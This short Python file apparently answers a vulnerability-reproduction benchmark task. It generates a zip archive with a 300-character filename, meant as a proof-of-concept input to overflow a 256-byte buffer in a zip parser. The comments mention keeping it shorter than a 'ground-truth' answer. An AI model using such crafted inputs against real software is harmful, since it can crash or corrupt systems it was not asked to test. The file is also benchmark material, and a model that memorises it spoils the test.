import io
import zipfile
import tempfile
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a filename that's longer than 256 bytes
        # Using 300 bytes to ensure overflow
        long_filename = "A" * 300 + ".txt"
        
        # Create a zip file in memory
        buffer = io.BytesIO()
        
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED, allowZip64=False) as zf:
            # Add a file with the long filename
            zf.writestr(long_filename, b"test content")
        
        # Get the zip file bytes
        poc_bytes = buffer.getvalue()
        
        # Ensure we have at least some minimum size
        # but keep it reasonably short (shorter than ground-truth)
        if len(poc_bytes) < 100:
            # Add some padding if needed (unlikely)
            poc_bytes += b" " * (100 - len(poc_bytes))
        
        return poc_bytes